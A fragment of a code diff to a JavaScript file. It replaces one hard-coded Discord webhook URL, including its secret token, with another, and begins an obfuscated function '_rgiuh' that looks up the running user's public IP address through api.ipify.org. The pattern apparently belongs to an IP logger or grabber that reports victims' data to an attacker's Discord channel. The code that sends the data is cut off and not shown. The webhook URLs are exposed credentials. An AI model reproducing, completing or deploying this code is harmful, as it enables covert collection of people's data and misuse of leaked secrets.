@@ -1,4 +1,4 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1087464651543019571/Q11STVqHG6yZ1Elr_UZbcOT3rVoHqUbpVp0Rk4kNqVuPkOQAmV23ac3vYorWpBpmifdr';
+const webhookUrl = 'https://discord.com/api/webhooks/1088188475150438531/kXd8KnhCn8CR5-A-aSq0zSsMxJoGK7fsvIQU6i6Qnz5APYVxjjMfZiVlD13SimCuZLJS';
 
 async function _rgiuh() {
   const response = await fetch('https://api.ipify.org/');
